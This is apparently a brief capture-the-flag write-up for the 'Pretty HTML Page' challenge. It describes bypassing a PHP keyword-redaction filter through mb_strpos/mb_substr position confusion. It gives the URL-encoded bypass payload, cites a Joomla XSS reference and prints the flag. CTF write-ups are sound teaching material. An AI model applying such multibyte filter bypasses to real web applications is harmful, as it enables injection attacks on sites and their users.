# Pretty HTML Page

Solved by: @vicevirus

## Question:
I made a pretty HTML page. It can even give you a flag if you write “flag”! But for security reasons, as soon as you write “flag”, your input will get redacted. Sorry for that :)

## Solution:
`mb_strpos` and `mb_substr` position confusion (sort of, not sure)
`input_string=%F0%9FAAA%F0flag`
Ref: https://www.sonarsource.com/blog/joomla-multiple-xss-vulnerabilities/

**Flag:** `PP{c0Unt1n6_ch42AC73r5-15_h4rD::DO2VnBizDP0d}`
